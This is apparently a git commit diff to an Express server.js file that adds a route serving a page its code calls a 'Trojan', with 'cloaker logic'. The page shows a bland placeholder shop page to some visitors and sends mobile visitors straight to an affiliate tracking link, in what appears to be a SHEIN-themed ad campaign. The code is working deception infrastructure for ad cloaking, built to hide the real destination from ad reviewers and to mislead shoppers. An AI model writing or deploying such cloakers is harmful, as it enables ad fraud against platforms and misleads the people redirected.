3648ea00fdc97aa3de8e68cab70c50a0341a8918
carsoncraig1 <156372400+carsoncraig1@users.noreply.github.com>
2024-05-14 16:43:09 -0400

    Update server.js

--- server.js
+++ server.js
@@ -272,6 +272,38 @@ app.get('/twcash/:slug', (req, res, next) => {
             console.log(`Served twshein Trojan (tyler)(${slug})`);
 });
 
+// Middleware to pass on Tyler's SubIDs Cash Direct Ryder
+app.get('/twryddir/:slug', (req, res, next) => {
+    const { offer, slug } = req.params;
+    const destinationLander = `https://glitchy.go2cloud.org/aff_c?offer_id=295&aff_id=2612&source=ryder`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug}</title>
+        </head>
+        <body>
+            <h1>Welcome to ${slug} Shop!</h1>
+            <p>You are shopping at: ${slug}</p>
+        </body>
+        </html>
+            `;
+            res.send(trojanHTML);
+            console.log(`Served twshein Trojan (tyler)(${slug})`);
+});
 
 // Middleware to pass on my slug values to MaxConv (SHEIN US CAMP)
 app.get('/shein/:slug', (req, res, next) => {
